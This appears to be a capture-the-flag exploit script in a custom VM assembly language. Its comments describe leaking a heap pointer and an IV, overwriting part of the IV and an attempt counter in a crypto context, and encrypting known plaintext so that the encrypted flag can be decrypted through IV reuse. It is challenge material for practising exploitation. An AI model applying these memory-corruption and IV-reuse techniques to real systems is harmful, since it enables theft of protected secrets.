# push crypto context on the heap
secret
# leak heap pointer
dst

# set ksp to heap to leak IV
pop ksp
addi ksp, 0xb50
mov kdx, ksp
dst

# overwrite 4 bytes of the IV plus the
# num_attempts value inside the crypto context
mov ksp, kdx
subi ksp, 0x18
movi kcx, 0xdeadbeef00000000
push kcx

# encrypt "A"*32
movi ksp, 0x0
movi kbx, 0x4141414141414141
push kbx
push kbx
push kbx
push kbx
movi kcx, 0x8
age kcx
dst

# encrypt "B"*32
# not really needed, used to verify that we can actually decrypt the data
movi ksp, 0x0
movi kbx, 0x4242424242424242
push kbx
push kbx
push kbx
push kbx
movi kcx, 0x8
age kcx
dst

# now set the num_attempts value
# so that ldf won't reset the IV before encrypting the flag
mov ksp, kdx
subi ksp, 0x18
movi kcx, 0xdeadbeef00000000
push kcx

# load the encrypted flag
ldf

hlt
